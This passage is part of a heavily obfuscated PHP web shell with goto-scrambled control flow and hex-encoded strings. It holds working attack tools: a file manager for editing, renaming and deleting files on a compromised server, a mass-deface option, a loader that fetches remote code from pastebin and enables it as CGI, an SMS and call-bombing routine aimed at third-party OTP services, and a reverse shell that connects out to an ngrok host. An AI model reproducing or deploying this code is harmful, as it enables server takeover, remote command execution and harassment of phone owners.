				<input type='text' class='input-sm' id='input' name='link'>
			</td>
		</tr>
	</table>
	<center>
		<br />
		<input type='submit' class='btn btn-danger' name='action'>
	</center>
</form>
<?php  goto CR_ra;
     YM1YN: $mykey = "\x41\x49\x7a\x61\x53\x79\x44\x4b\x76\x54\x43\x73\130\x58\x33\x56\151\160\x62\161\171\150\152\63\x61\60\x4a\x48\61\x44\x33\x4a\x59\115\165\102\65\x56\115";
     goto spoX_;
     PgsXr: $param = "\x68\164\x74\160\163\x3a\57\x2f\167\167\x77\56\x67\157\157\x67\x6c\x65\141\x70\151\x73\x2e\143\157\155\57\x75\162\154\x73\150\157\x72\x74\145\156\145\x72\x2f\166\x31\57\x75\x72\x6c\x3f\x6b\145\171\75{$mykey}";
     goto jtCAX;
     c5lwm: if (isset($json->error)) {
         goto Qrm00;
     }
     goto GNigg;
     U9Fu1: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     goto rez4Z;
     ggrzt: $jsondata = json_encode($post);
     goto K8VEb;
     GNigg: echo "\74\143\x65\x6e\164\145\x72\x3e\x3c\164\145\170\x74\141\x72\145\141\x20\x69\144\75\47\164\x65\x78\164\141\162\x65\x61\47\x20\143\x6c\x61\163\163\x3d\x27\146\157\x72\x6d\55\x63\157\156\164\162\x6f\x6c\x27\x20\162\145\141\144\x6f\x6e\x6c\171\76" . $json->id . "\x3c\57\x74\x65\170\164\x61\x72\x65\x61\x3e\x3c\x2f\143\145\x6e\x74\145\x72\x3e";
     goto lZxZH;
     mGuup: if (!isset($_POST["\141\143\164\151\x6f\x6e"])) {
         goto Ulh3s;
     }
     goto PgsXr;
     og7zG: LNads: goto pQu0I;
     lZxZH: goto LNads;
     goto H9LME;
     rez4Z: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     goto wlblg;
     H9LME: Qrm00: goto jDMpP;
     K8VEb: $ch = curl_init();
     goto fN8BU;
     CR_ra: die;
     goto Ruels;
     wlblg: curl_setopt($ch, CURLOPT_HEADER, 0);
     goto s2Om1;
     N7oWo: curl_setopt($ch, CURLOPT_POST, 1);
     goto HDn9R;
     spoX_: echo "\x3c\x63\145\156\x74\x65\x72\76\74\x68\62\76\123\150\x6f\x72\164\x6c\x69\x6e\153\x20\x47\x65\x6e\x65\x72\141\164\x6f\162\x3c\57\150\x32\76\x3c\x2f\143\145\x6e\x74\145\x72\x3e";
     goto mGuup;
     fN8BU: curl_setopt($ch, CURLOPT_URL, $param);
     goto U9Fu1;
     pQu0I: Ulh3s: goto gwOV0;
     P7_hf: $response = curl_exec($ch);
     goto t4VZ2;
     jDMpP: echo $json->error->message;
     goto og7zG;
     HDn9R: curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);
     goto P7_hf;
     Ruels:
 } goto cxDMj; lYqT1: if ($_GET["\x64\x6f"] == "\x72\x65\156\x61\155\145" and isset($_GET["\146\151\154\x65\x73"])) {
     goto yc9Lm;
 } goto WdgQ4; H2Oo2: glSbX(); goto eCp7p; eCp7p: goto Jkk29; goto aZCmH; YVxpL: goto Jkk29; goto xoXtw; wc7Yd: if (empty($_SERVER["\110\x54\124\x50\137\x55\x53\x45\122\137\x41\107\105\116\x54"])) {
     goto S1ihE;
 } goto HyKF2; IxX6P: if ($_GET["\x64\x6f"] == "\x6e\x65\x77" and isset($_GET["\144\x69\x72"])) {
     goto luKGR;
 } goto BWB1O; KJTqW: if (!preg_match("\x2f" . implode("\x7c", $userAgents) . "\x2f\151", $_SERVER["\x48\x54\x54\120\x5f\x55\x53\x45\122\x5f\101\x47\x45\x4e\124"])) {
     goto vdcmX;
 } goto tZReq; qmWpE: BV2P6: goto K88AD; rgZdR: function l1Zr1()
 {
     goto z7st_;
     S4MHk: echo "\74\x69\146\162\141\x6d\x65\x20\163\x72\143\x3d\x27\x2e\143\x6f\156\146\151\x67\x2f\x63\147\151\x2e\x69\x7a\157\47\x20\143\154\x61\x73\163\x3d\x27\x69\146\x72\141\155\x65\x27\40\x66\162\x61\x6d\x65\142\x6f\162\144\x65\x72\75\47\60\47\40\163\143\x72\157\x6c\154\x69\x6e\x67\75\x27\156\x6f\47\76\74\x2f\151\x66\162\x61\155\x65\76";
     goto NQ0Up;
     vW9z5: nyO53: goto pGSPU;
     NQ0Up: die;
     goto ff8Bk;
     NkBn1: file_put_contents("\x2e\x63\x6f\156\x66\x69\x67\x2f\56\150\x74\x61\x63\x63\145\163\x73", "\x41\144\144\110\141\x6e\x64\x6c\145\x72\40\x63\x67\151\55\163\x63\x72\151\160\164\40\x2e\x69\172\157\xa\x4f\160\x74\151\157\156\163\40\x2d\x49\x6e\x64\145\170\145\x73");
     goto hy0RM;
     p4fdd: if (file_exists("\56\143\x6f\x6e\146\x69\147")) {
         goto nyO53;
     }
     goto soI4a;
     vi13A: vbkQf: goto j5Otn;
     hy0RM: file_put_contents("\56\143\x6f\x6e\x66\x69\x67\x2f\143\x67\151\56\x69\172\157", file_get_contents("\x68\164\164\x70\163\x3a\57\x2f\160\x61\163\164\x65\142\x69\156\56\x63\x6f\x6d\57\x72\x61\x77\57\115\125\104\60\105\120\x6a\142"));
     goto fj69F;
     ff8Bk: goto vbkQf;
     goto yRwnt;
     soI4a: mkdir("\56\143\157\156\146\151\x67");
     goto vW9z5;
     qjjJg: jjIxg("\124\150\151\x73\40\x66\165\x6e\x63\x74\x69\157\x6e\x20\x6e\157\164\x20\x61\x76\x61\x69\154\x61\x62\x6c\145\40\x66\157\x72\x20\x57\151\156\144\157\x77\163\x20\x73\145\x72\x76\145\162");
     goto vi13A;
     fj69F: n7cKs: goto S4MHk;
     rMii0: if ($os == "\x57\151\156\144\x6f\x77\x73") {
         goto zqdgc;
     }
     goto p4fdd;
     z7st_: global $os;
     goto rMii0;
     pGSPU: if (file_exists("\56\143\157\x6e\146\x69\147\x2f\143\147\x69\x2e\151\x7a\x6f") and file_exists("\56\x63\x6f\156\146\x69\147\x2f\x2e\x68\x74\141\x63\143\145\163\163")) {
         goto n7cKs;
     }
     goto NkBn1;
     yRwnt: zqdgc: goto qjjJg;
     j5Otn:
 } goto s08OF; Vdgxk: $os = "\x57\151\x6e\x64\x6f\167\163"; goto Jwoo0; v0HnU: rtPa4($_GET["\x66\x69\154\145\x73"]); goto Eld8r; K88AD: CbVc0(); goto OHqrl; pSWnp: rea3J: goto Y4e5u; k0mSL: if ($_GET["\x64\x6f"] == "\x69\x6e\146\x6f") {
     goto BV2P6;
 } goto WoElu; xoXtw: Vb10t: goto qkQRD; g5XV0: goto Jkk29; goto a20F6; fP0qQ: if ($_GET["\144\157"] == "\x73\155\163") {
     goto vL5pr;
 } goto Vw1Hz; n4U_N: zS3q1: goto qkhAz; SoADm: function gyZGO()
 {
     JjIxG("\x54\x68\x69\163\40\x66\145\141\x74\x75\x72\x65\40\x75\156\x64\145\162\40\x64\x65\x76\145\x6c\157\160\155\x65\x6e\164");
 } goto dV0jz; SLwwz: zV8YQ: goto Fhp6L; Linvc: if ($_GET["\144\157"] == "\x6d\x61\x73\163\x5f\x64\145\146\141\x63\x65") {
     goto CR3t3;
 } goto k0mSL; WkBOZ: mIQb1: goto d_edT; BZ_hd: if (!function_exists("\146\x69\x6c\x65\137\147\145\x74\x5f\143\x6f\x6e\x74\x65\156\x74\x73")) {
     echo "\x3c\x73\x63\162\x69\x70\x74\x3e\141\x6c\145\x72\x74\50\x27\146\151\x6c\145\137\x67\145\164\x5f\143\157\156\x74\x65\x6e\x74\163\x20\146\x75\156\x63\164\151\157\156\x20\144\151\x73\x61\x62\x6c\x65\x64\54\40\x74\150\151\163\x20\x77\x65\142\163\x68\145\154\x6c\x20\156\x6f\x74\40\167\157\162\153\151\156\x67\40\x70\x72\157\x70\x65\162\154\x79\47\x29\74\57\x73\143\x72\151\x70\164\x3e";
 } goto nLbsJ; L1bpu: goto N4hON; goto tK6jq; gRcNX: N4hON: goto pSWnp; ANdEW: CR3t3: goto aux2O; ThQCb: Jkk29: goto iVxP2; JfUXZ: if (isset($_SESSION[sha1(md5($_SERVER["\x48\124\124\120\x5f\x48\117\x53\x54"]))])) {
     goto rjat_;
 } goto eXMF4; sdV4k: yc9Lm: goto nENXh; Jwoo0: yTl53: goto wc7Yd; OHqrl: goto Jkk29; goto WkBOZ; a20F6: q7lM0: goto lsPIc; r0gN3: function TnBrl()
 {
     echo "\74\x73\143\162\151\160\164\76\x77\x69\156\144\x6f\167\56\154\x6f\x63\141\164\151\157\x6e\75\x27\x3f\47\x3b\x3c\57\x73\143\x72\x69\x70\x74\76";
 } goto OxQua; G7bgQ: goto Jkk29; goto uZ0y4; iVxP2: gJTfH: goto pDr2s; Sp_ot: if (empty($email)) {
     goto zS3q1;
 } goto qdGnG; gcOHE: foreach ($dir as $dir) {
     goto Z6Vib;
     EDggY: echo "\74\164\x64\76\74\151\155\147\40\x73\x72\x63\75\47\x68\x74\164\x70\x73\x3a\57\x2f\143\x76\141\162\61\x39\x38\64\x2e\147\151\164\150\165\142\x2e\x69\157\x2f\164\x65\170\x74\55\160\154\141\151\x6e\55\x69\143\157\x6e\56\x70\x6e\147\x27\x20\143\154\x61\x73\163\x3d\x27\151\143\x6f\156\x27\76";
     goto xbFKS;
     Z6Vib: ?>
<table width='70%' class='table-hover' align='center'>
		<tr>
	<?php  goto ERZh_;
     Z5QzU: goto hdv70;
     goto Oq_Zr;
     bnE7V: ?>
	</tr>
	</table>
<?php  goto tFi3s;
     E0ixO: echo "\74\141\x20\x68\162\145\146\x3d\x27\x3f\x64\157\x3d\x76\x69\x65\x77\x26\146\151\154\x65\163\75" . getcwd() . $sep . $dir . "\x27\x3e{$dir}\74\x2f\141\x3e\x3c\x2f\164\x64\x3e";
     goto Pkd8p;
     Oq_Zr: Gjq8m: goto b3IPg;
     tFi3s: Dd4gC: goto Cd_w4;
     pmidC: if ($ext == "\x6a\x70\x67" or $ext == "\x70\x6e\x67" or $ext == "\x6a\160\x65\x67" or $ext == "\147\151\146" or $ext == "\162\141\162" or $ext == "\172\x69\160" or $ext == "\144\x6f\143" or $ext == "\160\144\146") {
         goto Gjq8m;
     }
     goto EDggY;
     xbFKS: echo "\x3c\141\x20\150\162\145\x66\x3d\47\77\144\157\x3d\145\x64\151\164\x26\146\151\x6c\x65\163\75" . getcwd() . $sep . $dir . "\47\76{$dir}\74\57\x61\x3e\74\x2f\x74\144\x3e";
     goto JUBn9;
     Pkd8p: echo "\x3c\164\x64\x20\163\164\x79\154\145\x3d\47\x66\x6c\x6f\x61\164\72\x72\x69\x67\x68\x74\x3b\155\141\162\x67\x69\156\55\x72\x69\147\150\164\x3a\x37\160\170\x3b\x27\76\xd\12\11\11\x3c\x61\x20\x63\154\141\163\x73\x3d\x27\142\x74\156\x20\x62\164\156\55\x73\x75\143\x63\145\163\163\40\142\164\x6e\55\170\163\x27\40\x68\162\x65\146\x3d\x27\77\x64\x6f\75\164\x6f\165\x63\x68\x26\x66\151\x6c\x65\x73\x3d" . getcwd() . $sep . dirname($dir) . "\47\x3e\116\x65\x77\40\x46\x69\x6c\145\x3c\57\141\76\xd\12\11\11\74\x61\40\x63\154\x61\x73\163\x3d\x27\x62\164\156\40\x62\x74\156\55\x73\165\x63\143\145\163\x73\40\142\x74\156\x2d\x78\x73\47\x20\x68\162\x65\146\75\x27\x3f\x64\157\75\156\145\167\46\x64\x69\162\x3d" . getcwd() . $sep . dirname($dir) . "\x27\x3e\x4e\145\x77\x20\104\x69\162\x3c\57\x61\x3e\xd\12\x9\x9\x3c\141\x20\143\154\141\163\x73\75\47\142\x74\156\40\x62\x74\156\x2d\163\165\143\143\x65\163\163\x20\142\x74\156\55\170\x73\x27\x20\x68\162\x65\146\75\47\77\x64\x6f\x3d\x63\150\155\157\144\x26\x66\151\x6c\x65\x73\x3d" . getcwd() . $sep . $dir . "\x27\76\103\150\155\157\144\x3c\x2f\x61\76\15\12\11\x9\x3c\141\x20\143\154\x61\163\163\75\x27\142\x74\x6e\x20\142\x74\x6e\55\x73\x75\143\143\145\163\163\x20\142\x74\156\x2d\x78\x73\x27\x20\x68\x72\x65\146\x3d\47\77\x64\157\x3d\x72\145\156\x61\155\x65\x26\x66\151\x6c\145\x73\75" . getcwd() . $sep . $dir . "\x27\x3e\122\145\156\x61\x6d\x65\x3c\57\x61\76\40\xd\xa\11\11\x3c\x61\40\x63\x6c\x61\x73\x73\x3d\x27\142\164\156\40\142\x74\x6e\55\x73\165\143\x63\145\x73\x73\x20\x62\164\156\55\x78\x73\47\40\150\x72\145\146\75\x27\77\144\x6f\x3d\144\x65\154\x65\x74\x65\x26\x66\151\x6c\x65\x73\x3d" . getcwd() . $sep . $dir . "\47\x3e\104\145\x6c\x65\164\145\74\57\164\x64\x3e";
     goto lxDpQ;
     XfGdu: vaQ3d: goto zTGk1;
     JEMqy: echo "\74\x61\x20\150\162\x65\146\75\47\x3f\x64\x6f\x3d\x6f\160\145\x6e\46\144\x69\x72\75" . getcwd() . $sep . $dir . "\47\76{$dir}\x3c\57\141\x3e\74\x2f\164\x64\76";
     goto EnY_N;
     EnY_N: echo "\74\x74\144\40\x73\x74\171\x6c\x65\75\47\146\x6c\x6f\141\x74\72\162\x69\147\x68\x74\73\155\141\x72\147\x69\156\x2d\162\x69\147\150\x74\72\x37\160\170\x3b\x27\x3e\15\12\11\11\74\x61\40\143\x6c\141\163\163\x3d\47\x62\164\156\40\142\164\156\x2d\163\165\x63\x63\145\163\x73\x20\x62\x74\x6e\x2d\x78\x73\x27\x20\150\x72\x65\146\x3d\47\x3f\144\x6f\75\x74\x6f\165\143\150\x26\x66\151\x6c\x65\x73\75" . getcwd() . $sep . dirname($dir) . "\47\x3e\x4e\145\167\40\106\151\x6c\145\74\x2f\x61\76\xd\12\x9\11\x3c\x61\40\x63\x6c\141\163\163\75\47\142\164\x6e\x20\142\x74\x6e\x2d\x73\165\143\x63\x65\163\163\40\x62\x74\x6e\x2d\170\x73\47\40\x68\162\x65\x66\x3d\x27\77\x64\157\x3d\156\145\x77\46\x64\x69\162\x3d" . getcwd() . $sep . $dir . "\47\76\x4e\145\x77\x20\104\x69\162\74\57\141\x3e\15\xa\x9\x9\74\x61\x20\143\154\x61\x73\163\75\x27\x62\164\156\x20\142\x74\156\55\163\x75\143\143\145\x73\x73\40\142\164\x6e\55\170\163\47\40\x68\x72\x65\x66\x3d\47\x3f\144\157\x3d\143\x68\x6d\x6f\144\46\146\x69\x6c\x65\x73\75" . getcwd() . $sep . $dir . "\x27\x3e\103\150\x6d\157\x64\74\57\141\76\15\12\x9\11\x3c\x61\40\143\154\141\x73\x73\x3d\47\x62\x74\x6e\x20\x62\164\156\x2d\x73\x75\143\143\145\x73\163\40\x62\164\156\55\170\163\47\40\150\x72\x65\x66\x3d\47\77\144\x6f\75\x72\145\156\x61\x6d\145\x26\x66\x69\154\145\163\x3d" . getcwd() . $sep . $dir . "\x27\76\122\x65\x6e\141\x6d\145\74\x2f\141\76\x20\xd\12\11\11\74\141\40\x63\x6c\141\x73\x73\75\x27\x62\x74\x6e\40\142\164\x6e\x2d\163\x75\143\x63\145\163\163\x20\142\x74\156\55\170\x73\47\x20\x68\162\x65\x66\x3d\x27\x3f\144\157\x3d\x64\x65\154\145\x74\145\46\x66\151\154\145\163\x3d" . getcwd() . $sep . $dir . "\47\x3e\104\x65\154\145\164\x65\x3c\57\x74\144\x3e";
     goto Z5QzU;
     JUBn9: echo "\74\164\x64\x20\x73\164\x79\154\x65\75\47\146\x6c\157\141\164\72\x72\x69\x67\150\x74\x3b\155\x61\162\x67\151\x6e\x2d\162\151\x67\x68\x74\x3a\67\x70\170\x3b\x27\76\15\xa\11\x9\74\141\40\x63\x6c\x61\x73\x73\x3d\47\142\164\x6e\x20\142\x74\x6e\55\163\165\x63\143\145\x73\163\x20\142\x74\x6e\55\x78\x73\x27\40\x68\x72\145\x66\75\47\x3f\144\157\75\x74\x6f\x75\143\x68\x26\x66\151\x6c\145\x73\75" . getcwd() . $sep . dirname($dir) . "\47\x3e\x4e\x65\167\x20\106\x69\x6c\x65\x3c\x2f\141\x3e\15\xa\11\x9\x3c\141\40\143\154\x61\163\163\x3d\x27\142\x74\156\40\142\164\156\x2d\x73\x75\143\143\145\x73\x73\40\142\164\156\x2d\x78\x73\x27\x20\x68\x72\145\x66\75\47\x3f\x64\157\x3d\156\145\167\x26\144\x69\x72\75" . getcwd() . $sep . dirname($dir) . "\x27\76\116\x65\167\x20\104\x69\x72\74\57\141\76\15\12\x9\11\x3c\141\x20\143\154\x61\163\x73\75\47\142\x74\x6e\40\142\164\156\55\163\165\143\x63\x65\163\x73\40\142\164\156\55\x78\163\x27\x20\150\162\x65\146\x3d\47\77\x64\157\x3d\x63\x68\x6d\157\x64\46\x66\151\154\145\x73\75" . getcwd() . $sep . $dir . "\47\x3e\103\x68\155\157\x64\x3c\x2f\141\76\15\12\11\11\x3c\x61\x20\143\154\141\x73\163\x3d\x27\142\164\x6e\40\142\164\156\55\x73\x75\x63\x63\145\163\x73\40\142\x74\156\x2d\170\x73\47\40\150\x72\145\x66\75\47\77\144\x6f\75\162\x65\x6e\x61\155\145\46\146\151\x6c\x65\x73\x3d" . getcwd() . $sep . $dir . "\47\x3e\x52\x65\156\141\155\145\x3c\x2f\x61\76\40\15\12\11\x9\x3c\x61\40\x63\x6c\x61\163\x73\75\47\x62\164\156\x20\x62\164\x6e\55\163\165\143\143\145\163\x73\40\142\164\156\x2d\170\x73\47\x20\x68\x72\x65\146\x3d\x27\x3f\144\x6f\75\x64\x65\154\x65\164\145\x26\x66\x69\154\x65\x73\75" . getcwd() . $sep . $dir . "\47\x3e\104\145\154\x65\164\x65\74\57\164\144\x3e";
     goto s0fYO;
     lxDpQ: hdv70: goto bnE7V;
     b3IPg: echo "\74\x74\x64\76\x3c\x69\x6d\x67\40\163\x72\x63\75\47\x68\164\x74\160\163\72\x2f\x2f\143\166\141\x72\x31\71\70\x34\x2e\147\151\x74\x68\x75\x62\x2e\x69\157\x2f\x74\145\170\x74\x2d\x70\154\141\x69\156\55\151\x63\157\156\x2e\x70\x6e\x67\47\40\143\x6c\141\163\x73\x3d\47\x69\143\x6f\x6e\x27\x3e";
     goto E0ixO;
     ERZh_: $ext = pathinfo($dir, PATHINFO_EXTENSION);
     goto BdbX6;
     s0fYO: goto hdv70;
     goto XfGdu;
     BdbX6: if (is_dir($dir)) {
         goto vaQ3d;
     }
     goto pmidC;
     zTGk1: echo "\74\x74\144\x3e\74\151\x6d\147\x20\x73\162\x63\75\47\x68\x74\x74\x70\163\x3a\57\x2f\x63\166\x61\162\61\x39\70\64\x2e\x67\151\164\150\x75\142\x2e\151\157\57\102\x6c\141\156\153\x2d\x46\157\154\144\x65\162\55\151\143\x6f\x6e\x2e\160\x6e\x67\47\x20\143\x6c\141\x73\x73\75\47\151\x63\157\x6e\x27\76";
     goto JEMqy;
     Cd_w4:
 } goto h0DV_; acC90: function XIZfI($filename)
 {
     goto DZmLr;
     arh4R: if (file_put_contents($filename, $_POST["\164\x65\170\x74"])) {
         goto ckiHe;
     }
     goto JVtU4;
     ZYUVq: echo $filename;
     goto zhx0V;
     s3yXF: ckiHe: goto bjM9z;
     UgNVA: $text = file_get_contents($filename);
     goto Giypk;
     HWcsA: PET72: goto ECV1A;
     x1nAH: die;
     goto DkaSn;
     bjM9z: jjIxg("\123\x75\143\145\163\x73");
     goto HWcsA;
     kvHTT: goto PET72;
     goto s3yXF;
     DZmLr: if (!isset($_POST["\164\x65\x78\x74"])) {
         goto y24W1;
     }
     goto arh4R;
     ECV1A: y24W1: goto UgNVA;
     zhx0V: ?></h5>
			<textarea name="text" class="form-control" id="textarea" cols=""
				rows=""><?php  goto SEufb;
     JVtU4: JjIXG("\x50\x65\x72\155\151\163\163\151\157\x6e\40\104\x65\156\151\145\144");
     goto kvHTT;
     Giypk: ?>
<form method="post">
		<center>
			<h5>Files Editor : <?php  goto ZYUVq;
     SEufb: echo htmlspecialchars($text);
     goto S1FNm;
     S1FNm: ?></textarea>
			<br> <input type="submit" class="btn btn-danger" />
		</center>
	</form>
<?php  goto x1nAH;
     DkaSn:
 } goto yTS4n; Y0_OA: function JLDte()
 {
     goto yGgBc;
     Md_vl: $no = explode("\xa", $_POST["\156\157"]);
     goto fRA5y;
     BzGNZ: $x = 0;
     goto HtkVY;
     V9k_V: goto Olvjd;
     goto K01Ds;
     lLNor: if (isset($_POST["\141\143\164\151\x6f\156"])) {
         goto Ygpa0;
     }
     goto VRY1K;
     SLw0m: yC5Wq: goto Bsx0N;
     efcZD: foreach ($no as $on) {
         goto mTvp3;
         zozos: NLYyO("\150\x74\x74\160\x3a\57\x2f\163\143\x2e\x6a\144\56\151\144\x2f\x70\x68\157\156\145\x2f\163\145\156\144\120\150\x6f\156\x65\123\155\163", "\x70\150\x6f\156\145\x3d" . $on . "\x26\163\155\163\x54\x79\x70\145\75\x31");
         goto Cn_Hp;
         tN7JA: yh0cE: goto KRkSY;
         mTvp3: echo "\x3c\x68\162\x3e\x53\x65\x6e\144\x20\x4f\124\120\x20\x54\157\x20\55\76\40" . $on . "\x3c\x68\162\x3e";
         goto zozos;
         Cn_Hp: Nlyyo("\x68\x74\164\x70\x73\72\x2f\57\167\167\167\56\x70\x68\144\56\143\157\x2e\151\144\57\x65\156\57\x75\163\145\162\x73\57\163\x65\156\144\x4f\124\120", "\x70\x68\157\x6e\x65\x5f\x6e\x75\x6d\142\x65\x72\x3d" . $on);
         goto tN7JA;
         KRkSY:
     }
     goto BDIiS;
     HtkVY: Olvjd: goto kfulV;
     Eec0M: goto yC5Wq;
     goto tdywn;
     OwEfv: $x++;
     goto V9k_V;
     fRA5y: $no = str_replace("\40", '', $no);
     goto rzMqz;
     kfulV: if (!($x < 100)) {
         goto BEoWj;
     }
     goto efcZD;
     BDIiS: ns5BD: goto wu0KG;
     sz0tu: foreach ($no as $on) {
         goto FY2wO;
         FY2wO: echo "\x3c\x68\162\x3e\x43\x61\154\x6c\x69\x6e\147\11\x20\55\x3e\x20" . $on . "\74\150\162\x3e";
         goto Tb0W2;
         QcNzq: wrdvW: goto u0GUw;
         Tb0W2: nLyYO("\x68\x74\x74\x70\163\x3a\57\57\x77\x77\x77\56\164\x6f\x6b\x6f\x63\x61\163\150\56\143\x6f\155\x2f\x6f\141\x75\164\x68\x2f\x6f\x74\160", "\155\x73\151\163\144\156\x3d" . $on . "\46\141\x63\x63\145\160\x74\75\x63\x61\154\154");
         goto QcNzq;
         u0GUw:
     }
     goto WviUo;
     VRY1K: die;
     goto Eec0M;
     K01Ds: BEoWj: goto SLw0m;
     yGgBc: ?>
<center>
		<h2>Multi Spam SMS</h2>
		<form method="post">
			<textarea name="no" class="form-control" id="textarea"
				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
			<br> <input type="submit" name="action" class="btn btn-danger" />
		</form>
	</center>
<?php  goto lLNor;
     tdywn: Ygpa0: goto Md_vl;
     wu0KG: zsbIq: goto OwEfv;
     Bsx0N: die;
     goto pc4y4;
     WviUo: iBsix: goto BzGNZ;
     rzMqz: $no = str_replace("\xa\12", "\xa", $no);
     goto sz0tu;
     pc4y4:
 } goto YRYYO; j2Kba: goto CJNkO; goto btcVT; M29w9: if ($_GET["\x64\157"] == "\157\x70\145\156" and isset($_GET["\144\151\x72"])) {
     goto kJyiJ;
 } goto aaD85; d940G: function jJANc($filename)
 {
     goto QSXZ_;
     xvKec: AVszr: goto ia0DG;
     ia0DG: ?>
   <form method='post'>
		<center>
			<td>Filename : <input type='text' class='input-sm' id='input'
				value='<?php  goto A1Ehh;
     uA17i: jjixg("\x53\165\143\x63\145\163\x73");
     goto cy3MG;
     McCVo: goto aQM3J;
     goto E5fJq;
     QSXZ_: if (!isset($_POST["\141\x63\x74\x69\x6f\156"])) {
         goto AVszr;
     }
     goto ce2Kz;
     E5fJq: QUGiY: goto uA17i;
     A1Ehh: echo $filename;
     goto iYHz4;
     ce2Kz: if (@rename($filename, $_POST["\156\x65\x77\156\141\x6d\x65"])) {
         goto QUGiY;
     }
     goto VQAd_;
     cy3MG: aQM3J: goto zX5gI;
     zX5gI: TnBrl();
     goto xvKec;
     VQAd_: JJiXG("\120\145\x72\155\151\x73\x73\151\x6f\x6e\40\x44\145\x6e\x69\145\x64");
     goto McCVo;
     iYHz4: ?>' name='newname'></td> <input
				type='submit' class='btn btn-danger' name='action' value='rename'>
		</center>
	</form>
	<?php  goto tep_k;
     tep_k: die;
     goto Qkzhs;
     Qkzhs:
 } goto KXAl7; GP2Ek: k3J3z(); goto j2Kba; ndz_0: function hnMnJ()
 {
     goto AWrmf;
     VtCA8: XsmTY: goto hxy6J;
     vAqLC: ux4Pj("{$errstr}\x20\50{$errno}\x29");
     goto qjLD6;
     b3FZ3: $input = fread($sock, $chunk_size);
     goto w2MBU;
     TiYzg: Lr9Gv: goto Uvy_Q;
     Jpe_l: if ($sock) {
         goto XsmTY;
     }
     goto vAqLC;
     KCXam: function uX4PJ($string)
     {
         goto Oqm46;
         qpkSQ: if ($daemon) {
             goto xIRyh;
         }
         goto PPoZz;
         QdRzk: xIRyh: goto QWC8A;
         Oqm46: global $daemon;
         goto qpkSQ;
         PPoZz: print "{$string}\12";
         goto QdRzk;
         QWC8A:
     }
     goto B_9xj;
     hxy6J: $descriptorspec = array(0 => array("\160\x69\x70\x65", "\x72"), 1 => array("\160\151\160\145", "\167"), 2 => array("\x70\151\160\145", "\167"));
     goto dpKR1;
     Pqa76: exit(1);
     goto DSE52;
     d4VTI: if (!in_array($sock, $read_a)) {
         goto MEwtL;
     }
     goto QwITV;
     NeM_K: $daemon = 1;
     goto JesLj;
     QVhEA: UX4PJ("\x53\x4f\x43\x4b\x20\122\105\101\x44");
     goto rYbNe;
     CoauX: umask(0);
     goto aC2Un;
     JesLj: M4yz0: goto FcilR;
     IZ42c: $chunk_size = 1400;
     goto ddYO9;
     JI657: fclose($pipes[2]);
     goto t6jtM;
     ADL1R: Ux4pJ("\127\x41\122\x4e\x49\116\107\x3a\x20\106\x61\151\154\145\144\40\164\x6f\x20\144\x61\x65\x6d\157\156\151\163\145\x2e\x20\40\x54\x68\151\163\x20\151\x73\x20\x71\x75\151\x74\x65\40\x63\157\x6d\155\x6f\156\40\141\156\x64\40\156\x6f\164\x20\146\x61\164\141\x6c\x2e");
     goto iSl_f;
     aPpXk: if (!$debug) {
         goto JJ1pp;
     }
     goto xGYTx;
     ddYO9: $write_a = null;
     goto TEXcD;
     h4_ny: stream_set_blocking($sock, 0);
     goto yVwp0;
     i4WYN: EiPhq: goto h6Sol;
     BUgg4: if (is_resource($process)) {
         goto vtgqz;
     }
     goto hixi0;
     rYbNe: jmOl9: goto b3FZ3;
     acpcj: goto EiPhq;
     goto oEO7l;
     p5SWi: exit(1);
     goto oRdYf;
     dpKR1: $process = proc_open($shell, $descriptorspec, $pipes);
     goto BUgg4;
     yoop2: if (!($pid == -1)) {
         goto L66QO;
     }
     goto UPYhD;
     iSl_f: goto M4yz0;
     goto uYEX_;
     MCrGV: if (!$debug) {
         goto kzHf7;
     }
     goto ozVEN;
     uYEX_: sXKoz: goto DSXR3;
     VB79R: $debug = 0;
     goto km4U9;
     N_dkf: kmVYk: goto Ogtyn;
     oDAd7: JJ1pp: goto w_eb_;
     aC2Un: $sock = fsockopen($ip, $port, $errno, $errstr, 30);
     goto Jpe_l;
     w2MBU: if (!$debug) {
         goto bjXkY;
     }
     goto xyHe8;
     X0CGF: $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
     goto d4VTI;
     N_aOB: stream_set_blocking($pipes[1], 0);
     goto v7cIP;
     K133l: Gerk7: goto aa_6I;
     JuMLP: $daemon = 0;
     goto VB79R;
     U74x2: bjXkY: goto rDuhH;
     Kz71S: LUsWJ: goto u8be6;
     u18Y8: if (!in_array($pipes[2], $read_a)) {
         goto LUsWJ;
     }
     goto aPpXk;
     XeAIf: if (!$pid) {
         goto Lr9Gv;
     }
     goto QlKfl;
     h6Sol: fclose($sock);
     goto ySLPn;
     rLr_R: fclose($pipes[1]);
     goto JI657;
     wYrmx: nH59i: goto DiGxl;
     QlKfl: exit(0);
     goto TiYzg;
     oRdYf: L66QO: goto XeAIf;
     AWrmf: if (isset($_POST["\141\x63\164\x69\157\156"])) {
         goto sGFej;
     }
     goto sX2M3;
     iaPNR: zAEGj: goto u18Y8;
     yVwp0: Ux4pj("\x3c\146\x6f\x6e\x74\x20\x63\x6f\x6c\157\x72\75\171\145\154\x6c\x6f\167\x3e\x53\165\x63\x63\145\x73\163\146\x75\x6c\154\x79\40\x6f\160\x65\156\x65\x64\x20\162\145\166\145\162\x73\x65\40\x73\150\x65\154\154\x20\164\x6f\40{$ip}\72{$port}\x20\x3c\57\146\157\x6e\164\x3e");
     goto wYrmx;
     CXiR0: if (!feof($pipes[1])) {
         goto U5lzq;
     }
     goto yfJB6;
     ySLPn: fclose($pipes[0]);
     goto rLr_R;
     xGYTx: uX4pj("\x53\x54\x44\x45\x52\122\40\122\x45\x41\104");
     goto oDAd7;
     nVOwv: die;
     goto V4hTm;
     TEXcD: $error_a = null;
     goto JuMLP;
     rDuhH: fwrite($pipes[0], $input);
     goto DCwvK;
     sX2M3: ?>
<center>
<h2>Reverse Shell</h2>
<form method='post'>
	<table align="center">
	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
	</tr>
	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='666' name='port'/></td>
	</tr>
	<tr>
		<td colspan="3">
			<center>
				<input type='submit' class='btn btn-danger' name='action' value='Open Connection'/>
			</center>
		</td>
	</tr>
</table>
</form>
	<?php  goto nVOwv;
